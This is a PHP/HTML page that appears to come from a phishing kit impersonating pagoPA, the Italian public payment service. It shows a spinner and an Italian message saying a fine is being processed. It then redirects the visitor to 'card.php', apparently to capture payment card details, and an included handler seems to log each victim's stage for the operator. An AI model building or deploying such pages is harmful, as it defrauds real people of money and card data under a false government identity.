<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>pagoPA</title>
  <link rel="icon" type="image/png" href="https://brandlogos.net/wp-content/uploads/2022/08/pagopa-logo_brandlogos.net_gp2p3.png">
  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;600&amp;display=swap" rel="stylesheet">

  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: 'Titillium Web', Arial, sans-serif;
      /* Gradient background: dark blue to sky blue */
      background: linear-gradient(180deg, #003366 0%, #00bfff 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      flex-direction: column;
      padding: 20px;
    }

    /* Logo section */
    .logo-section {
      background-color: rgba(0, 0, 0, 0.3);
      padding: 30px 20px;
      border-radius: 12px;
      margin-bottom: 40px;
      width: 300px;
      display: flex;
      justify-content: center;
      align-items: center;
      user-select: none;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }

    .logo-section img {
      width: 160px;
      height: auto;
    }

    .spinner {
      border: 6px solid rgba(255,255,255,0.3);
      border-top: 6px solid #00bfff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message-box {
      background-color: rgba(0, 0, 0, 0.3);
      padding: 20px 30px;
      border-radius: 12px;
      max-width: 90%;
      font-size: 18px;
      line-height: 1.5;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      user-select: none;
      max-width: 350px;
      margin: 0 auto;
    }

    @media (max-width: 480px) {
      .logo-section {
        width: 90%;
        padding: 20px 10px;
        margin-bottom: 30px;
      }

      .logo-section img {
        width: 120px;
      }

      .spinner {
        width: 48px;
        height: 48px;
        border-width: 5px;
        margin-bottom: 15px;
      }

      .message-box {
        font-size: 16px;
      }
    }
  </style>

  <script>
    // Redirect to pg.php after 10 seconds
    setTimeout(() => {
      window.location.href = 'card.php';
    }, 4000);
  </script>
</head>
<body>
  <section class="logo-section" aria-label="Logo PagoPA">
    <img src="https://brandlogos.net/wp-content/uploads/2022/08/pagopa-logo_brandlogos.net_gp2p3.png" alt="PagoPA Logo">
  </section>

  <div class="spinner" aria-label="Caricamento in corso"></div>

  <div class="message-box">
    ti preghiamo di rimanere su questa pagina<br>multa in fase di elaborazione...
  </div>


</body>
<?php 
$m->ctr("WAIT (".@$_GET['p'].")");
?>
</html>